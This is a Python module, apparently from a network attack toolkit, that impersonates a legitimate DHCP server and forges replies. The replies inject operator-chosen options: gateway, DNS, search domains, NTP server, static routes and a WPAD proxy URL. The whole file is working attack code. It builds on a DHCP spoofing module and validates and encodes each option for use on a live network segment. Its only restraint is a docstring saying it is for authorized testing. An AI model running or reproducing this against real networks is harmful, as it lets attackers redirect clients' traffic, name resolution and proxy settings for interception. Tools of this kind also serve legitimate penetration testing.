"""DHCP option manipulation: answer clients in the server's name with chosen options.

A client applies every option a DHCP reply carries: the gateway, DNS servers, search
domains, NTP servers, static routes and the proxy configuration (WPAD, option 252). A
forged reply can add or change any of them. This module reuses the spoofed reply of
DHCP Spoofing and adds the options the operator selects.

Options are encoded from text: domains as DNS labels (option 119), routes as
"prefix/length=router" (option 121), and plain values for the others.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import threading
from collections.abc import Callable
from dataclasses import dataclass
from typing import Any

from scapy.all import AsyncSniffer

from macabre.attacks.dhcp_spoofing import DhcpSpoofingConfig, DhcpSpoofingStats, run_dhcp_spoofing

OPTION_DOMAIN = 15
OPTION_NTP_SERVER = 42
OPTION_CLASSLESS_ROUTES = 121
OPTION_DOMAIN_SEARCH = 119
OPTION_WPAD = 252
MAX_VALUE_BYTES = 255


@dataclass(frozen=True)
class DhcpOptionManipulationConfig:
    iface: str                          # attacker interface, on the segment with the clients
    server_ip: str                      # the legitimate server's address (copied)
    server_mac: str                     # the legitimate server's MAC (copied; required)
    offer_ip: str                       # address offered to the client
    subnet_mask: str = "255.255.255.0"
    router: str = ""                    # gateway offered; empty = server_ip
    dns: str = ""                       # DNS server offered; empty = server_ip
    target_mac: str = ""                # only answer this client; empty = every client
    domain_name: str = ""               # option 15
    domain_search: str = ""             # option 119: comma-separated domains
    ntp_server: str = ""               # option 42: IPv4 address
    classless_routes: str = ""          # option 121: "prefix/length=router, ..."
    wpad_url: str = ""                  # option 252: proxy configuration URL
    dry_run: bool = False

    def __post_init__(self) -> None:
        build_extra_options(self)       # validates every option the same way the run does


def encode_domain_search(domains: str) -> bytes:
    """RFC 1035 labels for each domain, each ended by a zero byte."""
    out = b""
    for domain in (d.strip() for d in domains.split(",") if d.strip()):
        for label in domain.rstrip(".").split("."):
            data = label.encode("ascii")
            if not data or len(data) > 63:
                raise ValueError(f"Search domain label '{label}' must be 1 to 63 characters.")
            out += bytes([len(data)]) + data
        out += b"\x00"
    if not out:
        raise ValueError("Domain search list is empty.")
    return out


def encode_classless_routes(routes: str) -> bytes:
    """RFC 3442 routes: prefix length, significant network octets, then the router."""
    out = b""
    for entry in (e.strip() for e in routes.split(",") if e.strip()):
        if "=" not in entry or "/" not in entry:
            raise ValueError(f"Route '{entry}' must look like 198.51.100.0/24=10.99.0.254.")
        prefix_text, router_text = entry.split("=", 1)
        try:
            network = ipaddress.IPv4Network(prefix_text.strip(), strict=False)
            router = ipaddress.IPv4Address(router_text.strip())
        except ValueError as exc:
            raise ValueError(f"Route '{entry}' is not a valid IPv4 prefix and router.") from exc
        octets = (network.prefixlen + 7) // 8
        out += bytes([network.prefixlen]) + network.network_address.packed[:octets] + router.packed
    if not out:
        raise ValueError("Classless routes list is empty.")
    return out


def _ipv4_bytes(value: str, name: str) -> bytes:
    try:
        return ipaddress.IPv4Address(value.strip()).packed
    except ValueError as exc:
        raise ValueError(f"{name} must be an IPv4 address.") from exc


def _text_bytes(value: str, name: str) -> bytes:
    data = value.strip().encode("ascii")
    if not data or len(data) > MAX_VALUE_BYTES:
        raise ValueError(f"{name} must be 1 to {MAX_VALUE_BYTES} ASCII characters.")
    return data


def build_extra_options(config: DhcpOptionManipulationConfig) -> tuple:
    """(code, value) pairs for the options the operator selected, in code order."""
    options = []
    if config.domain_name:
        options.append((OPTION_DOMAIN, _text_bytes(config.domain_name, "Domain name")))
    if config.ntp_server:
        options.append((OPTION_NTP_SERVER, _ipv4_bytes(config.ntp_server, "NTP server")))
    if config.domain_search:
        value = encode_domain_search(config.domain_search)
        if len(value) > MAX_VALUE_BYTES:
            raise ValueError("Domain search list is longer than 255 bytes.")
        options.append((OPTION_DOMAIN_SEARCH, value))
    if config.classless_routes:
        value = encode_classless_routes(config.classless_routes)
        if len(value) > MAX_VALUE_BYTES:
            raise ValueError("Classless routes list is longer than 255 bytes.")
        options.append((OPTION_CLASSLESS_ROUTES, value))
    if config.wpad_url:
        options.append((OPTION_WPAD, _text_bytes(config.wpad_url, "WPAD URL")))
    return tuple(sorted(options, key=lambda option: option[0]))


def run_dhcp_option_manipulation(
    config: DhcpOptionManipulationConfig,
    stop_event: threading.Event,
    on_progress: Callable[[DhcpSpoofingStats], None],
    send: Callable[..., Any] | None = None,
    sniffer_factory: Callable[..., Any] = AsyncSniffer,
) -> DhcpSpoofingStats:
    """Answer clients in the legitimate server's name, with the selected options, until stopped."""
    spoofing = DhcpSpoofingConfig(
        iface=config.iface,
        server_ip=config.server_ip,
        server_mac=config.server_mac,
        offer_ip=config.offer_ip,
        subnet_mask=config.subnet_mask,
        router=config.router,
        dns=config.dns,
        target_mac=config.target_mac,
        dry_run=config.dry_run,
        extra_options=build_extra_options(config),
    )
    return run_dhcp_spoofing(spoofing, stop_event, on_progress, send=send, sniffer_factory=sniffer_factory)
